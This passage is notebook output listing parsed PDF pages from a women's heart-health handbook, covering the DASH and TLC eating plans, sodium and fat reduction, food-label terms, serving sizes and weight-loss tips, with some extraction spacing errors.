pressure dropped.  \\nThe DASH eating plan is geared especially to people with high\\nblood pressure or prehypertension, but it is a healthy plan foranyone, so share it with your family.  When people who havenormal blood pressure follow the DASH eating plan, especiallywhen they also consume less sodium, they may lessen theirchances of developing high blood pressure.  Remember, 90percent of middle-aged Americans go on to develop high bloodpressure.  Use the DASH plan to help beat the odds!\\n— 66 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 68}, page_content='“I HAVE TO LOSE WEIGHT AND REDUCE MY\\nCHOLESTEROL. THIS IS JUST THE BEGINNING OF A LONG BATTLE, AND I KNOW IT WON\\'T BE EASY, BUT I KNOW I HAVE TO DO IT.\" \\n—Rosario\\n— 67 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 69}, page_content='THE DASH EATING PLAN\\nThe DASH eating plan shown below is based on 2,000 calories a day.  The\\nnumber of daily servings in a food group may vary from those listed, dependingon how many daily calories you need.\\nFood Gr oup Daily Ser vings Serving Sizes\\n(except as noted)\\nGrains* 6–8 1 slice bread\\n1 oz dr y cereal†\\n1/2cupcooked rice, pasta, or cereal\\nVegetables 4–5 1 cup raw leafy vegetables\\n1/2cup cooked vegetables\\n6 oz vegetable juice\\nFruits 4–5 1 medium fruit\\n1/4cup dried fruit\\n1/2cupfresh, frozen, or canned fruit\\n1/2cup fruit juice\\nLow-fat or fat-free 2–3 1 cup milk or yogur t\\nmilk and milk 11/2oz cheese\\nproducts\\nLean meats, poultr y, 6 or less 1 oz cooked meats, poultr y, or fish \\nand fish 1 egg‡\\nNuts, seeds, 4–5 per week1/3cup or 11/2oz nuts\\nand legumes 2 tbsp peanut butter\\n2 tbsp or 1/2oz seeds\\n1/2cup cooked legumes  \\n(dry beans and peas)\\n— 68 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 70}, page_content='Food Gr oup Daily Ser vings\\n(except as noted)Serving Sizes\\nFats and oils§2–3 1 tsp soft margarine\\n1 tsp vegetable oil\\n1 tbsp mayonnaise\\n2 tbsp light salad dressing\\nSweets and \\nadded sugars5 or less \\nper week1 tbsp sugar\\n1 tbsp jelly or jam\\n1/2cup sorbet or gelatin\\n1 cup lemonade\\n* Whole grains are recommended for most grain servings as a good source of\\nfiber and nutrients.\\n†Serving sizes vary between 1/2cup and 11/4cups.  Check the product’s\\nNutrition Facts label.\\n‡Since eggs are high in cholesterol, limit egg yolks to no more than four per\\nweek.  Two egg whites have the same amount of protein as 1 ounce of meat.\\n§Fat content changes the serving amount for fats and oils.  For example, 1 tbsp\\nof regular salad dressing equals 1 serving; 1 tbsp of a low-fat dressing equals\\none-half serving; 1 tbsp of a fat-free dressing equals zero servings.\\n— 69 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 71}, page_content='HOLD THE SALT: HOW TO\\nSALT AND SODIUM IN YOUR DIETreduce\\nYou can help prevent and control high blood pressure by cutting\\ndown on salt and other forms of sodium.  Try to consume nomore than 2,300 mg of sodium a day—or, if you can, no more\\nthan 1,500 mg a day (2,300 mg of sodium equals 1 tsp of\\ntable salt, while 1,500 mg equals \\n2/3tsp).  Here are some tips\\non limiting your intake of salt and sodium:\\n■Choose low-sodium, reduced-sodium, or no-salt-added versions\\nof foods and condiments, when available.\\n■Choose fresh, frozen, or canned (low-sodium or no-salt-added)vegetables.\\n■Use fresh poultry, fish, and lean meat, rather than canned,smoked, or processed types.\\n■Choose ready-to-eat breakfast cereals that are lower insodium.\\n■Limit cured foods (such as bacon and ham), foods packed inbrine (such as pickles, pickled vegetables, olives, andsauerkraut), and condiments (such as mustard, horseradish,\\nketchup, and barbeque sauce).  Limit even lower sodium\\nversions of soy sauce and teriyaki sauce.  Use thesecondiments sparingly, as you do table salt.\\n— 70 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 72}, page_content='■Cook rice, pasta, and hot cereals without salt.  Cut back on\\ninstant or flavored rice, pasta, and cereal mixes, which usuallyhave added salt.\\n■Choose “convenience foods” that are lower in sodium.  Cut back on frozen dinners, mixed dishes such as pizza,packaged mixes, canned soups or broths, and salad dressings.\\nThese foods often have a lot of sodium.\\n■Rinse canned foods, such as tuna and canned beans, to\\nremove some of the sodium.\\n■Salt substitutes containing potassium chloride may be useful for some individuals, but they can be harmful to people withcertain medical conditions.  Ask your doctor before trying salt\\nsubstitutes.\\n■When you cook, be “spicy” instead of “salty.”  In cooking and\\nat the table, flavor foods with herbs, spices, wine, lemon, lime,vinegar, or salt-free seasoning blends.  Start by cutting your\\nsalt use in half.\\n— 71 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 73}, page_content='What Else Affects Blood Pressure?\\nA number of foods and other factors have been reported to affect\\nblood pressure.  Here are the latest research findings:\\n■Garlic and onions.  These foods have not been found to\\naffect blood pressure, but they are tasty, nutritious substitutesfor salty seasonings and can be used often.\\n■Caffeine.  This may cause blood pressure to rise, but onlytemporarily.  Unless you are sensitive to caffeine, you do nothave to limit how much you consume to prevent or control high\\nblood pressure.\\n■Stress.  Stress, too, can make blood pressure go up for a\\nwhile and has been thought to contribute to high bloodpressure.  But the long-term effects of stress are not clear.\\nFurthermore, stress management techniques do not seem to\\nprevent high blood pressure.  However, stress managementmay help you to control other unhealthy habits, such assmoking, overeating, or using too much alcohol.\\nHigh Blood Cholesterol and the TLC Program \\nThe TLC Program can help you to lower high blood cholesterol and\\nprotect your health.  TLC stands for “Therapeutic Lifestyle Changes,”a program that includes an eating plan that is low in saturated fat,\\ntransfat, and cholesterol.  The eating plan also adds plant stanols\\nand sterols to your diet as well as more soluble fiber.  The TLCProgram also calls for increased physical activity and weight\\ncontrol.  Adopt the TLC Program and you’ll lower your chances of\\ndeveloping heart disease, future heart attacks, and other heart\\ndisease complications.  (The main difference between the TLCand the DASH eating plans is that the TLC plan puts moreemphasis on decreasing saturated fat and \\ntrans fat to \\nlower blood cholesterol levels.) \\n— 72 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 74}, page_content='eating THE TLC WAY\\nIf your LDL cholesterol is above your goal level (see pages 32\\nand 33), you should start on the TLC eating plan right away.The TLC eating plan will help to reduce your LDL cholesterol and\\nlower your chances of developing heart disease.  If you already\\nhave heart disease, it w ill lessen your chances of a heart attack\\nand other heart-related problems.  On the TLC eating plan, you\\nshould eat as follows:\\n■Less than 7 percent of the day’s total calories from saturated fat.\\nLowering saturated fat is the most important dietary change forreducing blood cholesterol.\\n■Less than 200 mg of dietary cholesterol a day.\\n■No more than 25 to 35 percent of daily calories from total fat(includes saturated fat calories).\\n■Just enough calories to reach or maintain a healthy weight.\\n■In addition, you should get at least 30 minutes of moderate-intensity physical activity on most, and preferably all, days ofthe week.\\nIf your blood cholesterol is not lowered enough on the TLC Program,your doctor or registered dietitian may advise you to increasethe amount of soluble fiber and/or add cholesterol-lowering \\nfood products.  These products include margarines that contain\\ningredients called “plant sterols” or “plant stanol esters,” whichlower LDL cholesterol.  If your LDL level is still not loweredenough, your doctor may prescribe a cholesterol-lowering drugalong with the TLC Program.  (See “To Learn More” on page 119.) \\n— 73 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 75}, page_content='PATTIE\\n“There are a lot of things I want to do in my life, \\nso I know it’s important to take care of my health.Most women put everyone else before themselves, \\nbut you can’t put off taking care of your heart.”\\nThe Lowdown on Low Fat\\nRecently, a large study reported what seemed to be startling\\nresults:  women who reduced their total fat intake did notsignificantly reduce their risks for heart disease and other serious\\ndisorders.  This widely publicized Women’s Health Initiative (WHI)\\nstudy, which tracked more than 48,000 postmenopausal women,found that those who ate lower fat diets for an average of 8 yearshad about the same risk of heart attack, stroke, breast cancer, andcolon cancer as did women who ate whatever they wanted.\\nDoes this mean we can feast on french fries and fudge without a\\nsecond thought?  Not at all.  The WHI study was designed tostudy the impact of reducing total fat, without distinguishing\\nbetween “good” fats found in fish, nuts, and vegetable oils, and“bad” fats like saturated fat and \\ntrans fat, which are found in\\nprocessed foods, meats, and some dairy products.  The type of\\nfat you eat affects your heart disease risk.  Other studies have\\nfound that reducing “bad” fats lowers risks for heart disease and\\nfuture heart attacks, while consuming small amounts of “good”fats may be protective.  In fact, a closer look at the WHI studysupports the heart benefits of reducing “bad” fats.\\nThe bottom line is that women should continue to follow an\\neating plan that is low in saturated fat, \\ntrans fat, and cholesterol\\nto reduce their risk of heart disease.  (For specifics, see “Figuring\\nOut Fat” on page 79.)  Most of the fat you consume each day\\nshould come from vegetable oils, fish, nuts, and other sources of\\npolyunsaturated and monosaturated fats.\\n— 74 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 76}, page_content='Now You’re Cooking:  Limiting Saturated Fat, \\nTrans Fat, and Cholesterol\\nPlanning and preparing nutritious meals may take a little extra\\neffort, but the health benefits are huge.  Here are some tips forcutting down on saturated fat, \\ntrans fat, and dietary cholesterol,\\nwhich will help to lower your LDL cholesterol and reduce yourheart disease risk.  It will improve heart health for all women, and\\nmay be particularly helpful for those following the TLC eating plan.\\nMeat, Poultry, and Fish\\n■Choose fish, poultry, and lean cuts of meat.  Trim the fat from\\nmeats; remove the skin and fat from chicken.  Keep portionsizes moderate.\\n■Broil, bake, roast, or poach instead of frying.  When you do fry,use a nonstick pan and a nonstick cooking spray or a very smallamount of oil or margarine.\\n■Cut down on sausage, bacon, and processed high-fat cold cuts(which are also high in sodium).\\nMilk Products and Eggs \\n■Instead of whole milk or cream, use fat-free or 1-percent milk.\\n■Use fat-free or low-fat cheeses and yogurt.\\n■Replace ice cream with sorbet, sherbet, and fat-free or low-fatfrozen yogurt.  Keep portion sizes moderate.\\n■Limit the number of egg yolks you eat.  Two or fewer yolks perweek—including yolks in baked goods and in cooked orprocessed foods.  Egg whites contain no fat or cholesterol, so\\nyou can eat them often.  In most recipes, you can substitute\\ntwo egg whites for one whole egg.\\n■Use soft margarines (liquid or tub types) that contain little or no\\ntrans fat.  Trans fat is another type of dietary fat that raises LDL\\ncholesterol.\\n— 75 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 77}, page_content='Grains and Grain Products\\n■Eat foods with lots of fiber and nutrients and make sure that at\\nleast half of your grain products are whole grain.  Theseinclude whole-grain breads, pastas, and cereals, as well as\\nbrown rice.  When you check package labels, look for the\\nword “whole” in the ingredients.  Make sure that whole grainsappear among the first items listed.\\nSauces, Soups, and Casseroles \\n■After making sauces or soups, cool them in the refrigerator and\\nskim the fat from the top.  Do the same with canned soups.\\n■Thicken a low-fat sauce with cornstarch or flour.\\n■Make main dishes with whole-grain pasta, rice, or dry peasand beans.  If you add meat, use small pieces for flavoringrather than as the main ingredient.\\nWhen You Can’t Face Cooking \\n■Check nutrition labels to choose frozen dinners and pizzas thatare lowest in saturated fat, \\ntrans fat, and cholesterol.  Make\\nsure the dinners include vegetables, fruits, and whole grains—or add them on the side.\\n■Choose store-bought baked goods that are lowest in saturatedfat, cholesterol, \\ntrans fats, and hydrogenated (hardened) fats.\\nTrans fats, or trans fatty acids, are formed when vegetable oil\\nis hardened to become margarine or shortening in a processcalled “hydrogenation.”  Foods high in \\ntrans fats tend to raise\\nblood cholesterol.  Read labels.  To reduce trans fats, limit\\nproducts that list “hydrogenated oil” or “partially hydrogenatedoil” as an ingredient.  Also, remember that even no cholesterol\\nand fat-free baked goods still may be high in calories.\\n— 76 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 78}, page_content='Dining Out for Health \\nWith a little planning—and a willingness to speak up—you can\\neat healthfully when you dine out.  Here are some tips:\\n■You’re the customer.  Ask for what you want.  Most restaurantswill honor your requests.  You have nothing to lose by asking!\\n■Order small.  To reduce portion sizes, try ordering hearthealthy appetizers or children’s portions as your main meal.Or, take half of your entree home with you for lunch the next day.\\n■Ask questions.  Don’t hesitate to ask your server how foods areprepared and whether the restaurant will make substitutions.Ask if they will:\\n•Serve low-fat or fat-free milk rather than whole milk or cream.\\n•Tell you the type of cooking oil used.  (Preferred types, whichare lower in saturated fat, are canola, safflower, sunflower,corn, and olive oils.)\\n•Trim visible fat off poultry or meat.\\n•Leave all butter, gravy, and sauces off an entree or side dish.\\n•Serve salad dressing on the side.\\n•Meet special requests if you make them in advance.\\n■Select foods cooked by low-fat methods.  Look for terms suchas broiled, baked, roasted, poached, or lightly sauteed.\\n■Limit foods high in calories and fats, especially saturated fatand \\ntrans fat.  Watch out for terms such as fried, crispy,\\ncreamed, escalloped, Hollandaise, Bearnaise, casserole, andpastry crust.\\n— 77 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 79}, page_content='Make Healthy Choices For:\\n■Breakfast: Fresh fruit, a small glass of citrus juice, low-fat or \\nfat-free milk and yogurt, whole-grain bread products and\\ncereals, or an omelet made with egg whites or egg substitute.\\n■Beverages: Water with lemon, flavored sparkling water,\\njuice spritzer (half fruit juice and half sparkling water),unsweetened iced tea, or reduced-sodium tomato juice.\\n■Breads: Most yeast breads are low in calories and fat—as\\nlong as you limit the butter, margarine, or olive oil.  Choosewhole-grain breads, which are packed with important nutrients\\nand are full of fiber to make you feel fuller faster.  Also, watch\\nthe sodium content.\\n■Appetizers: Steamed seafood, fresh fruit, bean soups, or\\nsalad with reduced-fat dressing.\\n■Entrees: Skinless poultry, fish, shellfish, vegetable dishes, or\\npasta with red sauce or vegetables.  Limit your use of butter,\\nmargarine, and salt at the table.\\n■Salads: Fresh lettuce, spinach, and other greens; other fresh\\nvegetables, chickpeas, and kidney beans.  Skip high-fat andhigh-calorie nonvegetable choices such as deli meats, bacon,\\negg, cheese, and croutons.  Choose lower calorie, reduced-fat,\\nor fat-free dressings, lemon juice, or vinegar.\\n■Side dishes: Vegetables and grain products, including\\nwhole-grain rice or noodles.  Ask for salsa or low-fat yogurt\\ninstead of sour cream or butter.\\n■Dessert: Fresh fruit, fat-free frozen yogurt, sherbet, or fruit\\nsorbet (usually fat-free, but ask for the calorie content).  Trysharing a dessert.  If you drink coffee or tea with dessert, ask\\nfor low-fat or fat-free milk instead of cream or half-and-half.\\n— 78 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 80}, page_content='LABEL LANGUAGE\\nFood labels can help you choose items that are lower in sodium, saturated and\\ntotal fat, trans fat, cholesterol, and calories.  When you shop for groceries, look\\nfor these claims on cans, bottles, and other packaging: \\nSodium claims What they mean\\nSodium free or salt free Less than 5 mg of sodium per ser ving\\nVery low sodium 35 mg or less per ser ving \\nLow sodium 140 mg or less per ser ving\\nLow-sodium meal 140 mg or less per 31/2oz  \\nReduced or less sodium At least 25% less than the regular version\\nLight in sodium 50% less than the regular version\\nUnsalted or no salt added No salt added to product during processing,\\nbut this is not a sodium-free food\\nFat claims What they mean\\nFat free Less than 1/2g of fat per ser ving\\nLow saturated fat 1 g or less per ser ving and 15% or less of\\ncalories from saturated fat\\nLow fat 3 g or less per ser ving\\nReduced fat At least 25% less fat than the regular version\\nLight in fat Half the fat compared to the regular version\\nCalorie claims What they mean\\nCalorie free Less than 5 calories per ser ving\\nLow calorie 40 calories or less per ser ving \\nReduced or less calories At least 25% fewer calories per ser ving than\\nthe regular version\\nLight or lite 50% less fat or 33% fewer calories than the\\nregular version\\n— 79 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 81}, page_content='Know Your Foods\\nThe following are some additional tips on shopping, cooking,\\nand eating for heart health:\\n■To choose foods wisely, see “How To Read a Nutritional FactsLabel” on page 65 and “Label Language” on page 77.\\n■To prepare and eat heart healthy meals, see “Figuring Out Fat”on the next page and “What’s in a Serving?” on page 80.\\n■For other tips on making good food choices, see “Healthy Snacking”below and “Vitamins for Heart Health” on page 82.\\nHealthy Snacking\\nMany snacks, including many types of cookies, crackers, andchips, are high in saturated fat, \\ntrans fat, cholesterol, sodium,\\nand calories.  But that doesn’t mean you have to cut out allbetween-meal treats.  Keep the foods listed below on hand for\\nsnack attacks.  But keep in mind that while these snacks may \\nbe low in fat, many are not low in calories.  So watch how much you eat, especially if you are trying to control your weight.  Here are some healthier, low-fat snacks:\\n■100-percent fruit juices\\n■Vegetable sticks; try a dab of reduced-fat peanut butter on\\ncelery sticks\\n■Fat-free frozen yogurt, sherbet, and sorbet\\n■Low-fat cookies, such as animal crackers, graham crackers,ginger snaps, and fig bars\\n■Low-fat crackers, such as melba toast, or rice, rye, and sodacrackers.  Look for unsalted or low-sodium types\\n■Air-popped popcorn with no salt or butter; fat-free, low-sodium pretzels\\n■Fresh or dried fruit or fruits canned in their own juice\\n— 80 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 82}, page_content='FIGURING OUT FAT\\nYour personal “fat allowance” depends on how many calories you consume \\neach day.  If you do not have high blood cholesterol or heart disease, thesaturated fat in your diet should be less than 10 percent of your daily calories,and total fat should be 20 to 35 percent of calories.  Most fats should come fromfoods that are high in polyunsaturated fats and monosaturated fats, such as fish,nuts, and vegetable oils.\\nThe table below shows the maximum amount of saturated fat you should eat,\\ndepending on how many calories you take in each day.  If you have high blood cholesterol or heart disease, the amount of saturated fat will be different.(See “Eating the TLC Way” on page 71.)  Check the Nutrition Facts panel onfood labels to find out the number of fat grams—both saturated and total—ineach serving.\\nTotal Calorie Intake Limit on Saturated Fat Intake\\n1,200 13 g or less\\n1,600 18 g or less\\n2,000* 20 g or less\\n2,200 24 g or less\\n2,500* 25 g or less\\n2,800 31 g or less\\n* Percent Daily Values on Nutrition Facts labels are based on a 2,000-calorie\\ndiet.  Values for 2,000 and 2,500 calories are rounded to the nearest 5 gram\\nto be consistent with the Nutrition Facts label.\\n— 81 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 83}, page_content='WHAT’S IN A SERVING?\\nThe “Dietary Guidelines for Americans” offer a healthy overall eating plan.  \\nBut what counts as a serving?  Here’s a quick rundown of the food groups and number of servings you need of each:\\nFood Gr oup/Daily Ser vings What Counts as a Ser ving\\nBreads, cereals, rice, and pasta: 1 slice bread\\n6–11 ser vings 1 cup ready-to-eat cereal flakes\\n1/2cup cooked cereal, rice, pasta\\nVegetables:  3–5 ser vings 1 cup raw leafy vegetables\\n1/2cup other vegetables\\n3/4cup of vegetable juice\\nFruits:  2–4 ser vings 1 medium apple, banana, orange, pear\\n1/2cupfruit—chopped, cooked, canned \\n3/4cup fruit juice\\nMilk, yogur t, and cheese: 1 cup milk (nonfat or low fat)\\n2–3 ser vings 1 cup low-fat yogur t\\n11/2oz low-fat natural cheese\\n2 oz low-fat processed cheese\\n1 cupsoy-based beverage with \\nadded calcium\\nMeat, poultr y, fish, dr y beans, 2–3 oz of cooked lean meat, \\neggs, and nuts:  2–3 ser vings poultr y, or fish\\n(totals 5–7 ounces per day)1/2cup of cooked dr y beans or tofu \\ncounts as 1 oz of lean meat\\n21/2oz soyburger or 1 egg counts\\nas 1 oz of lean meat  \\n2 tbsp of peanut butter or 1/3cup \\nof nuts counts as 1 oz of meat \\nFats, oils, and sweets Use sparingly .  Choose foods lower in fat,\\nsaturated fat, transfat, and cholesterol\\n— 82 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 84}, page_content='Aim for a Healthy Weight\\nIf you are overweight or obese, taking off pounds can reduceyour chances of developing heart disease in several ways.  First,\\nlosing weight will directly lower your risk.  Second, weight loss\\ncan help to reduce a number of risk factors for heart disease aswell as lower your risk for other serious conditions.  Weight losscan help to control diabetes as well as reduce high blood pressureand high blood cholesterol.  Reaching a healthy weight can alsohelp you to sleep more soundly, experience less pain from arthritis,and have more energy to take part in activities you enjoy.\\nRemember, if you need to lose weight, even a small weight loss\\nwill help to lower your risks of heart disease and other serioushealth conditions.  At the very least, you should not gain anyadditional weight.  A recent study found that young adults whomaintain their weight over time, even if they are overweight,have lower risk factors for heart disease in middle age thanthose whose weight increases.\\nWhen it comes to weight loss, there are no quick fixes.\\nSuccessful, lasting weight loss requires a change of lifestyle, not a brief effort to drop pounds quickly.  Otherwise, you willprobably regain the weight.  Aim to lose \\n1/2pound to 2 pounds\\nper week—no more.  If you have a lot of weight to lose, ask\\nyour doctor, a registered dietitian, or a qualified nutritionist to\\nhelp you develop a sensible plan for gradual weight loss.\\nTo take off pounds and keep them off, you will need to make\\nchanges in both your eating and physical activity habits.  Weightcontrol is a question of balance.  You take in calories from thefood you eat.  You burn off calories by physical activity.  Cuttingdown on calories, especially calories from fat, is key to losingweight.  Combining this change in diet with a regular physicalactivity program, such as walking or swimming, will help you\\nboth shed pounds and stay trim for the long term.\\n— 83 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 85}, page_content='vitamins FOR HEART HEALTH \\nChoose Foods, Not Supplements\\nUntil recently, it was believed that antioxidant vitamins,\\nparticularly vitamin E and beta carotene, might protect against\\nheart disease and stroke as well as cancer.  But new researchshows that taking these vitamins in supplement form can beharmful—even deadly.\\nIn the case of vitamin E supplements, a review of 19 studies\\nshowed that daily doses of 400 international units (IUs) or moremay significantly increase the risk of death from all causes.Meanwhile, two major studies showed that supplementation with\\nbeta carotene (a substance that is converted to vitamin A in theliver) increases the risks of lung cancer and death in smokers.Other recent studies have shown no benefits to taking eithervitamin E or beta carotene supplements to prevent cardiovasculardiseases or cancer.\\nBut studies do suggest that antioxidants in foods protect heart\\nhealth.  So keep eating plenty of foods that are packed withthese vitamins.  Foods rich in vitamin E include vegetable oils\\n(especially safflower and sunflower oils), wheat germ, leafy\\ngreen vegetables, and nuts (almonds and mixed nuts).  Foodsrich in beta carotene are carrots, yams, peaches, pumpkin,apricots, spinach, and broccoli.\\nNote:  If you are taking vitamin E supplements for protection\\nagainst medical conditions other than cardiovascular diseases orcancer, talk with your doctor about the risks and benefits ofhigher dose vitamin E supplements.\\n— 84 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 86}, page_content='Getting Started\\nAnyone who has ever tried to lose weight—and keep it off—\\nknows that it can be quite a challenge.  Here are some tips tohelp you succeed:\\nEat for health.  Choose a wide variety of low-calorie,\\nnutritious foods in moderate amounts.  Include plenty of\\nvegetables, fruits, whole grains, and low-fat or fat-free milk, aswell as fish, lean meat, poultry, or dry beans.  Choose foods thatare low in fat and added sugars.  Choose sensible portion sizes.(See “Portion Distortion” on page 89.)\\nWatch calories.  To lose weight, most overweight people will\\nneed to cut 500 to 1,000 calories per day from their current\\ndiet.  For tips on choosing low-fat, low-calorie foods, see “TheSubstitution Solution” on pages 90 and 91.\\nKeep milk on the menu.  Don’t cut out milk products in\\ntrying to reduce calories and fat.  Milk and milk products are\\nrich in calcium, a nutrient that helps to prevent osteoporosis, abone-thinning disease.  Instead, choose low-fat or fat-free milkproducts, which have the same amount of calcium as whole-milkproducts.  Make the switch gradually.  If you’re used to drinking\\nwhole milk, first cut back to 2 percent, then to 1 percent, and\\nfinally to fat-free milk.\\nKeep moving.  Physical activity is key to successful, long-term\\nweight loss.  It can help you burn calories, trim extra fat fromyour waist, and control your appetite.  It can also tone yourmuscles and increase aerobic fitness.  To lose weight andprevent further weight gain, gradually build up to at least 60minutes of physical activity on most, and preferably all, days ofthe week.  If you’ve already lost weight, to keep it off you’ll needto get 60 to 90 minutes of daily physical activity.  That may soundlike a lot, but you can get results without running yourself ragged.\\n— 85 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 87}, page_content='A recent study showed that moderate-intensity physical activity,\\nsuch as brisk walking, helps people lose weight as effectively asmore vigorous exercise.  For more tips, see “Learn New Moves”\\non page 92.\\nSteer clear of fast food.  A single meal from a fast food\\nrestaurant may pack as many calories as you need for a whole\\nday!  A recent study showed that young adults who eatfrequently at fast food restaurants gain more weight and are athigher risk for diabetes in middle age than those who avoid thefast food habit.  If you do eat at a fast food place, choose saladsand grilled foods, and keep portion sizes small.  Ask for salad\\ndressings, mayonnaise, and other high-fat condiments to beserved on the side—or not at all.\\nForget the fads.  Fad diets, including the high-protein, low-\\ncarbohydrate diets, are not the answer.  As tempting as their\\npromises may be, most quick-fix diets provide poor nutrition andcause many side effects, especially those with less than 800calories per day.  Although fad diets can produce fast results,most of the weight loss is due to water loss.  The weight returnsquickly once you stop dieting.\\nKnow about medicines.  If you are very overweight, or if\\nyou are overweight and have other weight-related risk factors or\\ndiseases, your doctor may advise you to take a medicine to helpyou take off pounds.  You should use a weight-loss drug onlyafter you have tried a low-calorie diet, more moderate-intensityphysical activity, and other lifestyle changes for 6 months withoutsuccessfully losing weight.  Because weight-loss medicines haveside effects, you should consider all of the risks and benefitsbefore trying one of them.  These drugs should be used alongwith a low-calorie eating plan and regular physical activity, notas a substitute for these lifestyle changes.\\n— 86 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 88}, page_content='Get support.  Tell your family and friends about your weight-loss\\nplans, and let them know how they can be most helpful to you.\\nSome women also find it useful to join a structured weight-loss\\nprogram.  The most effective groups provide support and advice\\nfor permanently changing eating and physical activity habits.(See “How To Choose a Weight-Loss Program” on page 87.)\\nLock in your losses.  After 6 months of gradually losing\\nweight, switch your efforts to keeping the weight off by\\ncontinuing to eat a nutritious, lower calorie diet and by getting60 to 90 minutes of moderate-intensity physical activity per day.After several months of weight maintenance, talk with your health\\ncare provider about whether you need to lose additional pounds.\\nSeven Secrets of Successful Weight Management\\nIf you have ever tried to take off weight, you know that it’s more\\nthan a matter of promising yourself you’ll eat less and movemore.  You also need to mentally prepare yourself for new\\nbehaviors.  Here are some tips for getting and staying in a\\nhealthy weight mindset:\\nStart small.  Many people set unrealistic goals for the amount\\nof weight they want to lose.  But you can greatly improve yourhealth by losing just 5 to 10 percent of your starting weight.Even though you may choose to lose more weight later, keep inmind that this initial goal is both realistic and valuable.\\nSet smart goals.  It’s important to set goals that are specific,\\nachievable, and forgiving (allow yourself to be less than perfect).For example, “exercise more” is a fine goal, but it’s not veryspecific.  “Walk for 60 minutes every day” is specific andperhaps achievable.  But what if you get a bad cold one day, and there’s a drenching rainstorm on another?  “Walk for 60minutes, 5 days each week” is specific, achievable, andforgiving.  A great goal!\\n— 87 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 89}, page_content='Build on success.  Rather than select one big goal, choose a\\nseries of smaller goals that bring you closer and closer to your\\nlarger goal.  For example, if one of your big goals is to reduce\\nyour daily calories from 2,000 to 1,200, first reduce your\\ncalories to 1,700, then move to 1,400, and finally to 1,200.Likewise, with physical activity, first establish a small new habit—such as walking 10 minutes a day—and then gradually increaseit.  Everyone can find time to walk 10 minutes each day.  Whenyou experience success at reaching a small goal, it will motivateyou to keep moving toward your larger ones.\\nReward yourself! Rewards that you control will encourage\\nyou to achieve your goals.  For a reward to work well, choose\\nsomething you really want, don’t put off giving it to yourself, andmake it dependent on meeting a specific goal.  (Examples mightbe, “When I lose 10 pounds, I’ll go to the mall the next day andget a fabulous new nail polish.” or “When I’ve walked 60minutes daily for 3 weeks, I’ll take an afternoon off and treatmyself to a movie.”)  Avoid food as a reward.  It usually worksbetter to give yourself frequent, small rewards for reaching short-term goals than bigger rewards that require long, difficult effort.\\nWrite it down.  Regularly record what you do on your weight-\\nloss program, such as your daily calorie intake and amount ofphysical activity, as well as changes in your weight.  (Try toweigh yourself at the same time of day once or twice a week.)Keeping track this way can help you and your health careprovider determine what behaviors you may want to improve.Keeping tabs on your progress can also help you stay motivated.\\nKnow your triggers.  To lose weight successfully, you need\\nto be aware of your personal eating “triggers.”  These are the\\nsituations that usually bring on the urge to overeat.  For instance,you may get a case of the munchies while watching TV, whenyou see treats next to the office coffeepot, or when you’re with a\\n— 88 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 90}, page_content='friend who loves to eat.  To “turn off” the trigger, you’ll need to\\nmake a change in the tempting situation.  For example, if thepile of doughnuts near the coffeepot is hard to resist, leave the\\nscene as soon as you pour yourself a cup of coffee.\\nThe fine art of feeling full.  Changing the way you eat can\\nhelp you to eat less without feeling deprived.  Eating slowly can\\nhelp you feel satisfied sooner and therefore avoid secondhelpings.  Eating lots of vegetables and fruits and drinking plentyof noncaloric beverages can also make you feel fuller.  Anothertrick is to use smaller plates so that moderate portions don’t seemskimpy.  It also helps to set a regular eating schedule, especially\\nif you tend to skip or delay meals.\\nHow To Choose a Weight-Loss Program\\nSome people lose weight on their own, while others like the support\\nof a structured program.  If you decide to participate in a weight-loss program, here are some questions to ask before you join.\\n■Does the program provide counseling to help youchange your eating and activity habits?The program should teach you how to permanently change\\nthose eating and lifestyle habits, such as lack of physical\\nactivity, that have contributed to weight gain.  Research showsthat people who successfully keep weight off are those whomake changes in their overall lifestyles, rather than simply joina physical activity program.  \\n■Does the staff include qualified health professionals,\\nsuch as nutritionists, registered dietitians, doctors,nurses, psychologists, and exercise physiologists?\\nQualified professionals can help you lose weight safely and\\nsuccessfully.  Before getting started, you’ll need to beexamined by a doctor if you have any health problems,currently take or plan to take any medicine, or plan to losemore than 15 to 20 pounds. \\n— 89 —'),\n",
